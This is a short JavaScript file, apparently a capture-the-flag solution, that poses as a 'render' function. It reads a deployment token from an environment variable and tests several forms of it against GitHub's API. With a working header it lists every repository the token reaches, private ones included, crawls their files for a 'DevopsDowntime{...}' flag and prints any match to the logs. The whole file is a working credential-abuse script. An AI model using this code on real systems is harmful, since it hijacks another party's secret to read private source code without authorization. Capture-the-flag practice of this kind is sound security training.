export async function render(context) {
  const raw = process.env.PORTFOLIO_SYNC_TOKEN || "";
  console.log("RAWLEN", raw.length);
  const flagRe = /DevopsDowntime\{[^}]*\}/i;
  const variants = {
    raw,
    trim: raw.trim(),
    noquote: raw.trim().replace(/^["']|["']$/g, ""),
    nonl: raw.replace(/[\r\n\t ]/g, "")
  };
  let goodh = null;
  for (const [vn, v] of Object.entries(variants)) {
    if (!v || goodh) continue;
    for (const scheme of ["Bearer", "token"]) {
      const h = { Authorization: `${scheme} ${v}`, Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "x" };
      const r = await fetch("https://api.github.com/user", { headers: h });
      let u = null; try { u = await r.json(); } catch {}
      console.log("TRY", vn, scheme, r.status, u && (u.login || u.message));
      if (r.ok && !goodh) { goodh = h; break; }
    }
  }
  if (goodh) {
    const rr = await fetch("https://api.github.com/user/repos?visibility=all&affiliation=owner,collaborator,organization_member&per_page=100", { headers: goodh });
    let repos = []; try { repos = await rr.json(); } catch {}
    console.log("REPOS", JSON.stringify((repos || []).map(x => x.full_name + (x.private ? "#priv" : ""))));
    for (const rp of (repos || [])) {
      const full = rp.full_name;
      const stack = [""];
      while (stack.length) {
        const p = stack.pop();
        const cr = await fetch(`https://api.github.com/repos/${full}/contents/${p}`, { headers: goodh });
        if (!cr.ok) continue;
        let items = []; try { items = await cr.json(); } catch {}
        for (const it of (Array.isArray(items) ? items : [])) {
          if (it.type === "dir") { stack.push(it.path); continue; }
          const fr = await fetch(`https://api.github.com/repos/${full}/contents/${it.path}`, { headers: goodh });
          if (!fr.ok) continue;
          let c = null; try { c = await fr.json(); } catch {}
          if (c && c.content) {
            const body = Buffer.from(c.content, "base64").toString("utf8");
            const m = body.match(flagRe);
            if (m) console.log("FLAG_FOUND", full, it.path, m[0]);
          }
        }
      }
    }
  }
  console.log("DONE");
  return JSON.stringify({ ok: true }) + "\n";
}
